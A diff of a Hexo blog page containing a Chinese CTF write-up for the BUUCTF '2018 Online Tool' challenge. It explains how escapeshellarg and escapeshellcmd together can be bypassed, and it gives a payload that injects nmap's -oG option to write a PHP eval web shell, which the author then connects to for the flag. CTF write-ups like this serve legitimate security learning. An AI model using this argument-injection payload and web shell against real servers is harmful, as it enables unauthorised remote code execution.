@@ -7,7 +7,7 @@
 
 <html class="theme-next gemini use-motion" lang="en">
 <head>
-  <meta charset="UTF-8"/>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
@@ -101,13 +101,13 @@
 
 
 
-<meta name="description" content="2018 Online Tool打开就是源码 审计一下 挺简单的 除了escapeshellarg和escapeshellcmd没有见过，百度了一下https:&#x2F;&#x2F;paper.seebug.org&#x2F;164&#x2F; 12345678传入的参数是：172.17.0.2&amp;apos; -v -d a=1经过escapeshellarg处理后变成了&amp;apos;172.17.0.2&amp;apos;\&amp;apos;&amp;apos; -v -d a=1&amp;apos;，即先对单引号转义，再用">
+<meta name="description" content="2018 Online Tool打开就是源码 审计一下 挺简单的 除了escapeshellarg和escapeshellcmd没有见过，百度了一下https:&#x2F;&#x2F;paper.seebug.org&#x2F;164&#x2F;12345678传入的参数是：172.17.0.2&amp;apos; -v -d a=1经过escapeshellarg处理后变成了&amp;apos;172.17.0.2&amp;apos;\&amp;apos;&amp;apos; -v -d a=1&amp;apos;，即先对单引号转义，再用单">
 <meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF-2018 Online Tool">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;10&#x2F;BUUCTF-2018-Online-Tool&#x2F;index.html">
 <meta property="og:site_name" content="diao-diao-UPUP">
-<meta property="og:description" content="2018 Online Tool打开就是源码 审计一下 挺简单的 除了escapeshellarg和escapeshellcmd没有见过，百度了一下https:&#x2F;&#x2F;paper.seebug.org&#x2F;164&#x2F; 12345678传入的参数是：172.17.0.2&amp;apos; -v -d a=1经过escapeshellarg处理后变成了&amp;apos;172.17.0.2&amp;apos;\&amp;apos;&amp;apos; -v -d a=1&amp;apos;，即先对单引号转义，再用">
+<meta property="og:description" content="2018 Online Tool打开就是源码 审计一下 挺简单的 除了escapeshellarg和escapeshellcmd没有见过，百度了一下https:&#x2F;&#x2F;paper.seebug.org&#x2F;164&#x2F;12345678传入的参数是：172.17.0.2&amp;apos; -v -d a=1经过escapeshellarg处理后变成了&amp;apos;172.17.0.2&amp;apos;\&amp;apos;&amp;apos; -v -d a=1&amp;apos;，即先对单引号转义，再用单">
 <meta property="og:locale" content="en">
 <meta property="og:updated_time" content="2020-02-21T06:29:23.021Z">
 <meta name="twitter:card" content="summary">
@@ -146,7 +146,7 @@
 
 
 
-  <title>BUUCTF-2018 Online Tool | diao-diao-UPUP</title>
+  <title>BUUCTF-2018 Online Tool | diao-diao-UPUP</title><!-- hexo-inject:begin --><!-- hexo-inject:end -->
   
 
 
@@ -165,7 +165,7 @@
     
   
 
-  <div class="container sidebar-position-left page-post-detail">
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -407,14 +407,8 @@
       
 
       
-        <h1 id="2018-Online-Tool"><a href="#2018-Online-Tool" class="headerlink" title="2018 Online Tool"></a>2018 Online Tool</h1><p>打开就是源码 审计一下 挺简单的 除了escapeshellarg和escapeshellcmd没有见过，百度了一下<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a></p>
-<figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">传入的参数是：<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>' -v -d a=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">经过escapeshellarg处理后变成了<span class="string">'172.17.0.2'</span>\<span class="string">''</span> -v -d a=<span class="number">1</span>'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"></span><br><span class="line">经过escapeshellcmd处理后变成<span class="string">'172.17.0.2'</span>\\<span class="string">''</span> -v -d a=<span class="number">1</span>\<span class="string">'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：</span></span><br><span class="line"><span class="string">http://php.net/manual/zh/function.escapeshellcmd.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后执行的命令是curl '</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\<span class="string">''</span> -v -d a=<span class="number">1</span>\<span class="string">'，由于中间的\\被解释为\而不再是转义字符，所以后面的'</span>没有被转义，与再后面的<span class="string">'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'</span>，即向<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\发起请求，POST 数据为a=<span class="number">1</span>'</span><br></pre></td></tr></table></figure>
-<p>最后看一下</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.<span class="variable">$host</span>)</span><br></pre></td></tr></table></figure>
-<p>百度一下发现nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
-<p>构造payload:</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=' <span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"hack"</span>]);<span class="meta">?&gt;</span></span> -oG hack.php '</span><br></pre></td></tr></table></figure>
-
+        <h1 id="2018-Online-Tool"><a href="#2018-Online-Tool" class="headerlink" title="2018 Online Tool"></a>2018 Online Tool</h1><p>打开就是源码 审计一下 挺简单的 除了escapeshellarg和escapeshellcmd没有见过，百度了一下<br><a href="https://paper.seebug.org/164/" target="_blank" rel="noopener">https://paper.seebug.org/164/</a><br><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">传入的参数是：<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>' -v -d a=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">经过escapeshellarg处理后变成了<span class="string">'172.17.0.2'</span>\<span class="string">''</span> -v -d a=<span class="number">1</span>'，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</span><br><span class="line"></span><br><span class="line">经过escapeshellcmd处理后变成<span class="string">'172.17.0.2'</span>\\<span class="string">''</span> -v -d a=<span class="number">1</span>\<span class="string">'，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义：</span></span><br><span class="line"><span class="string">http://php.net/manual/zh/function.escapeshellcmd.php</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">最后执行的命令是curl '</span><span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>'\\<span class="string">''</span> -v -d a=<span class="number">1</span>\<span class="string">'，由于中间的\\被解释为\而不再是转义字符，所以后面的'</span>没有被转义，与再后面的<span class="string">'配对儿成了一个空白连接符。所以可以简化为curl 172.17.0.2\ -v -d a=1'</span>，即向<span class="number">172.17</span><span class="number">.0</span><span class="number">.2</span>\发起请求，POST 数据为a=<span class="number">1</span>'</span><br></pre></td></tr></table></figure><br>最后看一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.<span class="variable">$host</span>)</span><br></pre></td></tr></table></figure><br>百度一下发现nmap命令中 有一个参数-oG可以实现将命令和结果写到文件</p>
+<p>构造payload:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?host=' <span class="php"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">"hack"</span>]);<span class="meta">?&gt;</span></span> -oG hack.php '</span><br></pre></td></tr></table></figure></p>
 <p>得到文件名：4061e5b4e6077706350ae44e5292f3ef<br>用菜刀连接4061e5b4e6077706350ae44e5292f3ef/hack.php<br>得到flag</p>
 
       
@@ -539,7 +533,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-count">43</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -1141,6 +1135,8 @@
   
 
   
+  
+
 
   
 
@@ -1148,7 +1144,7 @@
 
   
   <!-- 页面点击小红心 -->
-<script type="text/javascript" src="/js/src/clicklove.js"></script>
+<script type="text/javascript" src="/js/src/clicklove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
 </body>
 </html>
